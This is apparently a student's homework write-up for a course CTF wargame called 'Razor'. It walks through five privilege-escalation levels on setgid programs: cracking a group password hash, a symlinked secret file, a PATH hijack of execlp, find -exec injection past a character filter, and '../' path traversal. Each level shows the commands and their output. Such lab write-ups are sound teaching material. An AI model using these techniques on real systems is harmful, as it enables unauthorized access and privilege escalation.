# Homework 2 - Razor CTF challenges

## Level 1

The challenge is to get access to the folder `/var/challenge/level1`. On first inspection, we can see that the folder is restricted with the following permissions:

```bash
icyfire@razor challenge → ls -lhd level1
drwxr-x--- 2 root lev1 4.0K Aug 27  2020 level1
```

In order to get inside the folder, we need to add ourselves into the group `lev1`. Looking at the entry for this group in `/etc/group` we can see this.

```bash
icyfire@razor challenge → cat /etc/group | grep lev1:
lev1:$1$gbj8oioH$vThJ7/AAk0Yowijh0QaZK0:2001:jrblack,icyfire
```

We can see that the password hash for the group `lev1` is public. We can use John the ripper to try and find the plain text password from the hash with the help of `rockyou.txt` wordlist.

```bash
icyfire@razor scratch → cat > group.txt
lev1:$1$gbj8oioH$vThJ7/AAk0Yowijh0QaZK0:2001:jrblack,icyfire

icyfire@razor scratch → john --wordlist=rockyou.txt group.txt 
Loaded 1 password hash (md5crypt [MD5 32/64 X2])
No password hashes left to crack (see FAQ)

icyfire@razor scratch → john --show group.txt 
lev1:security:2001:jrblack, icyfire

1 password hash cracked, 0 left
```

We can see that the password for the group is `security`. We can use the following command to change the current GID of the login session and then run the `l33t` command.

```bash
icyfire@razor scratch → newgrp lev1
Password:

icyfire@razor scratch → l33t
Woot! Congratulations you broke level lev1!
Adding user 'icyfire' to group 'lev1' ...
Adding user icyfire to group lev1
Done
```

## Level 2

Inspecting the contents of directory `level1`

```bash
icyfire@razor level1 → ls -lha
total 32K
drwxr-x---  2 root lev1 4.0K Aug 27  2020 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev2 9.2K Aug 27  2020 1
-rw-r--r--  1 root lev1  505 Aug 27  2020 1.c
-r--r-----  1 root lev2    9 Aug 27  2020 .secret
-rw-------  1 root lev2  669 Aug 27  2020 .viminfo
```

The program `1` has `setgid` privileges to have an effective GID of the group `lev2`. Inspecting the source code of the program `1.c`:

```c
...
#define HASH "ab8e63c8bbe4ef68e6bc718b90720d02"
...
f = popen("/bin/cat ~/.secret | /usr/bin/md5sum", "r");
...
if (!strcmp(buf, HASH)) {
    execl("/bin/sh", "/bin/sh", (void *)NULL);
}
...
```

The program opens a file called `.secret` and if the md5 sum of the contents of the file match the hash given in the top of the file, it will spawn a shell which consumes the parent process. The folder also has a file `.secret`. Assuming the file has the correct content, we can create a symlink of that file to the current user's home directory and then execute the program.

```bash
03:27:06 icyfire@razor level1 → ln -s /var/challenge/level1/.secret ~/.secret

03:27:08 icyfire@razor level1 → ./1
$ l33t
Woot! Congratulations you broke level lev2!
Adding user 'icyfire' to group 'lev2' ...
Adding user icyfire to group lev2
Done
```

## Level 3

Inspecting the contents of directory `level2`

```bash
icyfire@razor level2 → ls -lha
total 24K
drwxr-x---  2 root lev2 4.0K Aug 27  2020 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev3 9.4K Aug 27  2020 2
-rw-r--r--  1 root lev2 1.4K Aug 27  2020 2.c
```

Looking the contents of the source code `2.c`

```c
...
execlp("tidy", "tidy", "-asxml", (char *)0);
...
```

The contents filename given as the first command-line argument is redirected to the input of tidy HTML sanitizer. The variant of `exec` function used here is `execlp`. This particular variation looks for the executable in the `PATH` environment variable.

We can create a temporary symlink to `/bin/sh` in a directory and add the folder with that executable to `PATH` ahead of `/bin` folder. We create a dummy text file with the command that we want to run, which is `l33t`. Then we call `./2` with the dummy file we gave as the first parameter. Since our evil `tidy` executable linked to `/bin/sh` comes up first in `PATH`, it gets executed with the dummy file with commands as one of the parameters.

```bash
icyfire@razor level2 → ln -s /bin/sh ~/scratch/level2/tidy

icyfire@razor level2 → export PATH=/home/icyfire/scratch/level2/:$PATH

icyfire@razor level2 cat > ~/scratch/level2/command.txt
exec l33t > /home/icyfire/scratch/level2/out.txt

icyfire@razor level2 → ./2 ~/scratch/level2/command.txt 
OK!

icyfire@razor level2 → cat ~/scratch/level2/out.txt 
Woot! Congratulations you broke level lev3!
Adding user 'icyfire' to group 'lev3' ...
Adding user icyfire to group lev3
Done
```

## Level 4

Inspecting the contents of directory `level3`

```bash
icyfire@razor level3 → ls -lha
total 24K
drwxr-x---  2 root lev3 4.0K Oct 20  2020 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev4 9.2K Aug 27  2020 3
-rw-r--r--  1 root lev3  821 Aug 27  2020 3.c
```

Looking at the contents of `3.c`:

```c
for (i = 1; i < argc; i++) {
    for (j = 0; j < strlen(argv[i]); j++) {
      if ((argv[i][j] == '&') ||
	      (argv[i][j] == '>') ||
	      (argv[i][j] == '<') ||
	      (argv[i][j] == '$') ||
	      (argv[i][j] == '`') ||
	      (argv[i][j] == ';') ||
	      (argv[i][j] == '|')) {
		fprintf(stderr, "Input contains prohibited characters\n");
		return 2;
      } else if (argv[i][j] == '\\') {
        ++ j;
      }
    }
  }
    
  for (i = 1; i < argc; i++) {
    snprintf(buf, 1023, "/usr/bin/find /home -iname %s", argv[i]);
    system(buf);
  }
```

We can see that the program is filtering out all the special characters from the command line parameters. We can also see that, escaping of characters using `\` is also allowed. The program searches for the value given in the first command line argument in the `/home` directory using the `find` command. The `find` command has an `-exec` parameter which allows us to run commands on the resulting paths. We can use the same `-exec` parameter to execute the `l33t` command.

```bash
icyfire@razor level3 → ./3 "icyfire -exec l33t \;" 2> ~/scratch/level3/error.txt
Woot! Congratulations you broke level lev4!
Adding user 'icyfire' to group 'lev4' ...
Adding user icyfire to group lev4
Done
```

Since there is a lot of output from the `find` command, I redirected `stderr` to a file for readability.

## Level 5

Inspecting the contents of `level4`;

```bash
icyfire@razor level4 → ls -lha
total 24K
drwxr-x---  3 root lev4 4.0K Oct 11 17:37 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev5 7.6K Aug 27  2020 4
-rw-r--r--  1 root lev4  932 Aug 27  2020 4.c
drwxr-xr-x  3 root lev4 4.0K Aug 27  2020 devel

icyfire@razor level4 → ls -lha devel
total 12K
drwxr-xr-x 3 root lev4 4.0K Aug 27  2020 .
drwxr-x--- 3 root lev4 4.0K Oct 11 17:37 ..
drwxr-xr-x 2 root lev4 4.0K Aug 27  2020 bin

icyfire@razor level4 → ls -lha devel/bin
total 184K
drwxr-xr-x 2 root lev4 4.0K Aug 27  2020 .
drwxr-xr-x 3 root lev4 4.0K Aug 27  2020 ..
-rwxr-xr-x 1 root lev4  51K Aug 27  2020 cat
-rwxr-xr-x 1 root lev4 124K Aug 27  2020 ls
```

Inspecting the source code `4.c`:

```c
...
#define PREFIX_DIR "/var/challenge/level"
#define DEVBIN_DIR "/devel/bin/"
...
sprintf(path, "%s%d%s%s", PREFIX_DIR, getegid() - 2000 - 1, DEVBIN_DIR, argv[1]);
printf("Executing: %s\n", path);
execv(path, &argv[1]);
...

```

From the source code we can see that the program appends the last digit of the GID of the process owner to the `PREFIX_DIR` path. In this case, because of the setgid bit, the number appended would be `4`. So the effective path of the program executed will be `/var/challenge/level4/devel/bin/<param1>` where `<param1>` is the first parameter passed to the program. We can do path manipulation using `../` to trick the program to run `l33t`. In unix `..` refers to the parent directory of the current directory.

```bash
icyfire@razor level4 → ./4 ../../../../../usr/local/bin/l33t
Woot! Congratulations you broke level lev5!
Adding user 'icyfire' to group 'lev5' ...
Adding user icyfire to group lev5
Done
```